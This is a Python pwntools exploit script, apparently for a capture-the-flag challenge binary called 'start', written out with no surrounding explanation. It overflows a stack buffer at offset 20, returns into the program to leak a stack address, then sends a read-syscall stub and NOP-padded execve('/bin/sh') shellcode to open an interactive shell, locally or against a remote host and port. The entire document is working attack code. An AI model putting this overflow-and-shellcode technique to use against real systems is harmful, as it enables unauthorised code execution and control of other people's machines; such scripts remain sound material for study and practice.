#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('start')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *0x0804809C
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    offset = 20

    payload = flat({
        offset: [
            exe.sym["_start"] + 39 # mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80;
        ]
    })

    io.sendafter(b":", payload)
    stack = u32(io.recv()[:4]) - 0x4
    info("stack: %#x", stack)

    sc = asm(
        """
            read:
                mov eax, 0x3
                int 0x80
        """
    )

    sh = asm(
        """
            execve:
                xor eax, eax
                mov al, 0xb
                xor ecx, ecx
                xor edx, edx
                mov ebx, esp
                add ebx, 0x18
                int 0x80

        """
    )

    payload = sc
    payload = payload.ljust(offset, b"\x90")
    payload += p32(stack)

    stage2 = b"\x90" * 0x10 + sh + b"\x90" * 0x11 + b"/bin/sh\x00"

    io.sendline(payload)
    io.send(stage2)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

